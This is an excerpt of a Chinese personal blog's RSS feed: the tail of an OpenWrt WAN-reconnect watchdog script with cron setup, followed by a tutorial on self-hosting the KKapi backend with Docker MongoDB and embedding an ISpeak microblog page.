&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; echo &lt;span style="color:#e6db74"&gt;&amp;#39;ifup wan!!!&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; $LOG_PATH
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; echo &lt;span style="color:#e6db74"&gt;&amp;#39;ifup wan!!!&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ifdown wan
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sleep &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ifup wan
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; cnt&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#重连后，等待20秒再进行ping检测&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sleep &lt;span style="color:#ae81ff"&gt;20&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#网卡重启超过指定次数还没恢复正常，重启软路由&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; reboot_cnt&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;expr $reboot_cnt + 1&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#f92672"&gt;[&lt;/span&gt; $reboot_cnt &lt;span style="color:#f92672"&gt;==&lt;/span&gt; $REBOOT_CNT &lt;span style="color:#f92672"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; echo -n &lt;span style="color:#e6db74"&gt;`&lt;/span&gt;date &lt;span style="color:#e6db74"&gt;&amp;#39;+%Y-%m-%d %H:%M:%S&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt; &amp;gt;&amp;gt; $LOG_PATH
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; echo &lt;span style="color:#e6db74"&gt;&amp;#39;-&amp;gt; =============== reboot!&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; $LOG_PATH
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; echo &lt;span style="color:#e6db74"&gt;&amp;#39;-&amp;gt; =============== reboot!&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sshpass -p &lt;span style="color:#ae81ff"&gt;132465&lt;/span&gt; ssh -p &lt;span style="color:#ae81ff"&gt;22&lt;/span&gt; root@192.168.1.1 &lt;span style="color:#e6db74"&gt;&amp;#39;reboot&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sleep $SLEEP_SEC
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;daemon.sh&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;LOG_PATH&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;/root/ping/log.txt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 用ps获取ups进程数量&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;NUM&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;ps | grep ping.sh | grep -v grep | wc -l&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo &lt;span style="color:#e6db74"&gt;${&lt;/span&gt;NUM&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 少于1，重启进程&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#f92672"&gt;[&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;${&lt;/span&gt;NUM&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt; -lt &lt;span style="color:#e6db74"&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; /root/ping/ping.sh &amp;gt; /dev/null &amp;amp;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; echo -n &lt;span style="color:#e6db74"&gt;`&lt;/span&gt;date &lt;span style="color:#e6db74"&gt;&amp;#39;+%Y-%m-%d %H:%M:%S&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt; &amp;gt;&amp;gt; $LOG_PATH
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; echo &lt;span style="color:#e6db74"&gt;&amp;#39;-&amp;gt; Ping daemon start&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; $LOG_PATH
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;s&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;du -k /root/ping/log.txt|awk &lt;span style="color:#e6db74"&gt;&amp;#39;{print $1}&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#f92672"&gt;[&lt;/span&gt; $s -gt &lt;span style="color:#ae81ff"&gt;500000&lt;/span&gt; &lt;span style="color:#f92672"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; chengdatetime&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;date &lt;span style="color:#e6db74"&gt;&amp;#34;+%Y-%m-%d %H:%M:%S&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; echo $chengdatetime&lt;span style="color:#e6db74"&gt;&amp;#34;:log size is large than expected and cleaning is started&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; $LOG_PATH
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; cat /dev/null &amp;gt; /root/ping/log.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;exit &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后在 openwrt 的管理后台 &amp;mdash;&amp;gt; 系统 &amp;mdash;&amp;gt; 计划任务中添加&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;4&lt;/span&gt; * * * reboot
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; */1 * * * /root/ping/daemon.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第一行是每天 4 点重启路由器，第二行是启动检测存活脚本（看好文件路径别错），可以自行设置计划运行时间。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;分割线，以下是旧内容&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;这个我也遇到过了，不知道是什么原因，毕竟我自己用电脑连着认证时不时也会掉，但是也有搜到的下面的办法&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://blog.csdn.net/weixin_35251837/article/details/119553540" target="_blank" rel="noopener"
&gt;https://blog.csdn.net/weixin_35251837/article/details/119553540&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;/etc/ppp/options&lt;/code&gt; 文件中添加 &lt;code&gt;persist&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="完工"&gt;完工
&lt;/h2&gt;&lt;p&gt;读到这里相信你也费了好大的力气了，也恭喜你，至少你是一个善于坚持的人，请享用你的校园网吧。有问题可以在评论区提问。&lt;/p&gt;</description></item><item><title>KKapi+ISpeak说说页面部署</title><link>https://www.braindance.top/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/</link><pubDate>Tue, 04 Oct 2022 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/kkapi+ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;感觉原来的 Artitalk 说说不好康，在开往里发现好多博客都用的说说功能叫叨叨点啥，看了看作者的&lt;a class="link" href="https://www.antmoe.com/speak/" target="_blank" rel="noopener"
&gt;说说页面&lt;/a&gt;，可以插入图片和标签分类，还有仅自己可见的功能，感觉挺不错的（实际是自己想折腾）所以就整一个。自己在部署过程中实在是踩了不少的坑，而且作者的文档感觉写的也不算完善，所以打算自己记录一下。&lt;/p&gt;
&lt;h2 id="项目结构"&gt;项目结构
&lt;/h2&gt;&lt;p&gt;作者的文档中各种仓库链接属实给我跳晕了，最后理出来的项目分为以下部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;kkapi&lt;/code&gt;。是作为说说的后端部分，连接 MongoDB 数据库，还有一个&lt;code&gt;kkadmin&lt;/code&gt;的管理页面&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ISpeak&lt;/code&gt;。说说的主体部分，依赖于后端的 &lt;code&gt;kkapi&lt;/code&gt; ，分为前端的展示页面，和一个对接后端的发布说说页面。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作者文档中给出很多部署方法，白嫖版的就是 vercel 后端 api + 管理界面 + MongoDB 提供的云服务，但是个人感觉 vercel 经常被墙，所以部署的 api 感觉也不会稳定，而且考虑到数据的存放问题，所以我选择的是都部署到自己服务器上。&lt;/p&gt;
&lt;h2 id="后端部署"&gt;后端部署
&lt;/h2&gt;&lt;h3 id="docker-安装-mongodb"&gt;Docker 安装 Mongodb
&lt;/h3&gt;&lt;p&gt;安装可以参考菜鸟教程的 &lt;a class="link" href="https://www.runoob.com/docker/docker-install-mongodb.html" target="_blank" rel="noopener"
&gt;Docker 安装 MongoDB&lt;/a&gt; 。因为之前听过 MongoDB 的未授权访问，所以考虑到安全性问题，创建容器的时候添加 &lt;code&gt;MONGO_INITDB_ROOT_USERNAME&lt;/code&gt; 和 &lt;code&gt;MONGO_INITDB_ROOT_PASSWORD&lt;/code&gt; 设置用户的账号密码，开启Docker MongoDB 的身份验证。考虑到数据未来的迁移可以通过 &lt;code&gt;-v&lt;/code&gt; 挂载宿主机的一个目录。可以修改默认端口再减少一些风险。最后我启动的命令如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker run -d --name mongodb &lt;span style="color:#ae81ff"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;&lt;/span&gt; -p xxxxx:27017 &lt;span style="color:#ae81ff"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;&lt;/span&gt; -v /my/own/datadir:/data/db &lt;span style="color:#ae81ff"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;&lt;/span&gt; -e MONGO_INITDB_ROOT_USERNAME&lt;span style="color:#f92672"&gt;=&lt;/span&gt;mongoadmin &lt;span style="color:#ae81ff"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;&lt;/span&gt; -e MONGO_INITDB_ROOT_PASSWORD&lt;span style="color:#f92672"&gt;=&lt;/span&gt;secret &lt;span style="color:#ae81ff"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;&lt;/span&gt; --restart&lt;span style="color:#f92672"&gt;=&lt;/span&gt;always
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mongo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后可以使用工具测试一下连接。&lt;/p&gt;
&lt;h3 id="kkapi-部署"&gt;kkapi 部署
&lt;/h3&gt;&lt;p&gt;和项目文档中的教程差不多，要注意使用的 node 版本请高于 &lt;code&gt;16.0.0&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先克隆项目源码
&lt;code&gt;git clone https://ghproxy.com/https://github.com/kkfive/kkapi-open.git&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;接下来项目需要安装的工具 &lt;code&gt;yarn&lt;/code&gt; 和 &lt;code&gt;pm2&lt;/code&gt;，分别是
&lt;code&gt;npm i yarn -g&lt;/code&gt;
&lt;code&gt;npm i pm2 -g&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;然后安装项目所需依赖 &lt;code&gt;yarn install&lt;/code&gt; 。&lt;/li&gt;
&lt;li&gt;之后再执行 &lt;code&gt;yarn build&lt;/code&gt; 编译项目。这里我的小鸡顶不住编译所以自己在本地编译传上去了💧。&lt;/li&gt;
&lt;li&gt;在项目文件夹创建环境变量文件，格式如&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-env" data-lang="env"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;PORT&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;3000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;DATABASE_URL&lt;span style="color:#f92672"&gt;=&lt;/span&gt;mongodb://127.0.0.1:27017/kkpaiopen?authSource&lt;span style="color:#f92672"&gt;=&lt;/span&gt;admin
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;DATABASE_USER&lt;span style="color:#f92672"&gt;=&lt;/span&gt;mongoadmin
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;DATABASE_PASSWORD&lt;span style="color:#f92672"&gt;=&lt;/span&gt;secret
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 加密密钥 测试&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;SECRETKEY&lt;span style="color:#f92672"&gt;=&lt;/span&gt;xxxxxxxxxxxxxxx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的数据库连接地址我原来还想使用MongoDB提供的免费云服务当数据库，但是没搞成功，所以最后使用了本地的 MongoDB，有大佬知道的可以指点一下。&lt;/p&gt;
&lt;ol start="6"&gt;
&lt;li&gt;使用 &lt;code&gt;pm2&lt;/code&gt; 使用守护线程启动项目
&lt;code&gt;pm2 start pm2.json&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我启动项目遇到了 &lt;code&gt;[PM2][WARN] Expect “restart_delay” to be a typeof [object Number], but now is [object String]&lt;/code&gt; 错误，这个错误原因是作者的 pm2.json 中的 &lt;code&gt;restart_delay&lt;/code&gt; 值是字符串类型 &lt;code&gt;60s&lt;/code&gt; 改成数值 &lt;code&gt;60&lt;/code&gt; 就可以了。&lt;/p&gt;
&lt;ol start="7"&gt;
&lt;li&gt;
&lt;p&gt;测试项目是否成功启动
可以使用 &lt;code&gt;lsof -i:端口&lt;/code&gt; 查看端口是否被监听判断项目是否成功启动。没成功的原因大概率是因为数据库连接地址、数据库账号密码不正确。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;创建初始化用户
&lt;code&gt;curl http://127.0.0.1:3000/api/user/init&lt;/code&gt;
创建的默认用户名和密码是 &lt;code&gt;admin&lt;/code&gt; 和 &lt;code&gt;123456&lt;/code&gt;，这个用户名密码用来登陆可视化的管理后台，并且用户似乎&lt;strong&gt;只能拥有一个&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="kkapiadmin可视化管理后台"&gt;kkapiadmin（可视化管理后台）
&lt;/h3&gt;&lt;p&gt;参考&lt;a class="link" href="https://kkapi.js.org/guide/admin/setup.html" target="_blank" rel="noopener"
&gt;官方文档&lt;/a&gt;中的教程，使用的 Vercel 部署的。这个墙不墙的就无所谓了，注意的坑有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;修改部署分支和生产分支为 &lt;code&gt;vercel&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;fork 作者仓库的时候记得把 only fork master 取消勾选。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之后登录就是用前面初始化的用户名密码，进入后台以后可以修改密码。登陆后台以后需要设置：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ISpeak 标签。因为发布说说是需要选择标签的，标签中的背景颜色值是&lt;strong&gt;十六进制的颜色&lt;/strong&gt;代码&lt;/li&gt;
&lt;li&gt;添加用户token。&lt;strong&gt;需要注意！！！&lt;/strong&gt;，添加的token的&lt;strong&gt;标题&lt;/strong&gt;只能是 &lt;code&gt;speak&lt;/code&gt; 不能是其他的，否则发布说说时会提示token不存在，发布时验证的就是字段为 &lt;code&gt;speak&lt;/code&gt; 的token的值。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/04/c5191febc049fbed86f5b77df8367c89.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;接下来可以在前端说说页面测试发布说说，发布说说需要输入后端 kkapi 地址、用户id （在管理后台可以找到）、token。网址：https://ispeak-biubiu.vercel.app/&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/04/778dcc5fe051722e4f9a919b7a9e2a61.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/04/491fff2969d731ff17d8799fe6a20d14.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;发布成功可以在后端看到发布的说说。&lt;/p&gt;
&lt;h2 id="前端部署"&gt;前端部署
&lt;/h2&gt;&lt;p&gt;我使用的是 Ispeak 搭配的 twikoo 评论，因为现在博客使用的就是 twikoo，省去了再部署评论的麻烦。根据&lt;a class="link" href="https://kkapi.js.org/posts/ispeak/" target="_blank" rel="noopener"
&gt;ISpeak文档部分&lt;/a&gt;，&lt;a class="link" href="https://github.com/kkfive/ISpeak/blob/master/src/types/parameter.ts" target="_blank" rel="noopener"
&gt;ispeak 配置项&lt;/a&gt;中 &lt;code&gt;comment&lt;/code&gt; 是一个回调函数，可以自行初始化评论，参照twikoo评论初始化的格式。我博客中的说说页面代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;div&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;id&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;tip&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;style&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;text-align:center;&amp;#34;&lt;/span&gt;&amp;gt;ipseak加载中&amp;lt;/&lt;span style="color:#f92672"&gt;div&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;div&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;id&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;ispeak&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style="color:#f92672"&gt;div&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;link&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;rel&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;href&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;https://cdn.staticfile.org/highlight.js/10.6.0/styles/atom-one-dark.min.css&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;link&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;rel&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;href&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;https://cdn.jsdelivr.net/npm/ispeak@4.4.0/style.css&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;script&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;https://cdn.staticfile.org/highlight.js/10.6.0/highlight.min.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style="color:#f92672"&gt;script&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;script&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;https://cdn.staticfile.org/marked/2.0.0/marked.min.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style="color:#f92672"&gt;script&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;script&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;https://cdn.jsdelivr.net/npm/ispeak@4.4.0/ispeak.umd.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style="color:#f92672"&gt;script&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
